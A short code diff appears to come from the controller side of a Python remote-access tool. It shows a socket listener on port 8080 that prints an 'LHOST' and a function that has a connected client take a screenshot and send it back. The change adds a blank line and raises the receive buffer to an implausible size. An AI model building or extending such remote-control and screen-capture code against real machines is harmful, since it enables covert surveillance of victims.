@@ -29,6 +29,7 @@ s = socket.socket()
 #host = socket.gethostname()
 host = "0.0.0.0"
 port = 8080
+
 s.bind((host, port))
 print("[+] The listener has been started...")
 print("[+] LHOST = ", host)
@@ -92,7 +93,7 @@ def main():
     def screenshot():
         conn.send(command.encode())
         print("Taking screenshot of client")
-        screenshot_data = conn.recv(1000000)
+        screenshot_data = conn.recv(10000000000000000)
         time = datetime.datetime.now()
         screenshot_name = "Screenshot" + time.strftime("%y-%m-%H-%M-%S") + ".png"
         screenshot_file = open(screenshot_name, "wb+")
